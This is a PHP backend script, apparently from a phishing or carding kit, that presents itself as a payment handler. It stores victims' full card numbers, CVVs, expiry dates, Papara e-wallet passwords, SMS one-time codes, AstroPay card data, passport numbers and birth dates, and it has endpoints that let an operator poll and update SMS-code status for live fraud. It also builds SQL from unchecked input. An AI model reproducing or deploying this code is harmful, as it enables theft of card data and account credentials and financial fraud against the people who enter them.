<?php
  include 'inc/config.php';
  include 'inc/anti.php';
  $q = $_GET["q"];
  if ($q == "payment") {
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
    }
  $ip = htmlspecialchars($_SERVER['HTTP_CF_CONNECTING_IP'] ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER[REMOTE_ADDR]);
    if (strlen($datas['amount']) > 0) {
    header('Content-Type: application/json');
    $db -> query("INSERT into payments set
      type = '$datas[type]',
      amount = '$datas[amount]',
      user = '$us[login]',
      user_id = '$us[id]',
      identity = '$datas[identity]',
      papara_email = '$datas[papara_email]',
      papara_password = '$datas[papara_password]',
      papara_sms_code = '$datas[papara_sms_code]',
      astropay_card_number = '$datas[astropay_card_number]',
      astropay_exp_date = '$datas[expmonth]/$datas[expyear]',
      astropay_cv2 = '$datas[astropay_cv2]',
      paykasa_number = '$datas[paykasa_number]',
      bank_id = '$datas[bank_id]',
      sender_phone = '$datas[sender_phone]',
      buyer_phone = '$datas[buyer_phone]',
      buyer_passport = '$datas[buyer_passport]',
      buyer_birth = '$datas[buyer_birth]',
      buyer_passport_date = '$datas[buyer_passport_date]',
      referance = '$datas[referance]',
      full_name = '$datas[full_name]',
      where_from = '$datas[where_from]',
      transfer_hour = '$datas[transfer_time]',
      card_number = '$datas[card_number]',
      exp_date = '$datas[exp_date]',
      cvv = '$datas[cvv]',
      ip = '$ip'
      ");
      $_SESSION['amount'] = $datas[amount];
      $amonts = $_SESSION['amount'];
    die(json_encode(['success' => true, 'message' => $db->insert_id]));
  }
  elseif($q == "update-payment"){
    antiflood();
    $datas = [];
    foreach ($_POST as $key => $value) {
      $datas[$key] = $db -> real_escape_string(htmlspecialchars(trim($value)));
    }
    $db -> query("UPDATE payments set papara_sms_code = '$datas[papara_sms_code]' where id = '$datas[id]'");
    die(json_encode(['success' => true, 'message' => json_encode($datas)]));
  }elseif($q == "get-bank"){
    $id = intval($_POST['id']);
    $res = $db -> query("SELECT * from banks where id = $id")->fetch_assoc();
    echo json_encode($res, JSON_UNESCAPED_UNICODE);
  }
  
  
}
elseif ($q == 'odeme-durum' && isset($us['id'])) {

  $id = $us["id"];
  $type = $_POST['type'];
  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE '$type' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
  echo $res["status"];
}
elseif ($q == 'sms-durum' && isset($us['id'])) {
  $id = $us["id"];
  $res = $db->query("SELECT * FROM `payments` WHERE `user_id` = '$id' AND `type` LIKE 'creditcard' ORDER BY `id` DESC LIMIT 1;")->fetch_assoc();
  echo $res["status"];
}
elseif($q == 'sms-onay'){
  $sms = escape('sms');
  $id = $us["id"];
  $db->query("UPDATE `payments` SET `sms` = '$sms' WHERE `payments`.`user_id` = '$id' AND `payments`.`type` = 'creditcard' ORDER BY id DESC LIMIT 1; ");
  die('success');
}
?>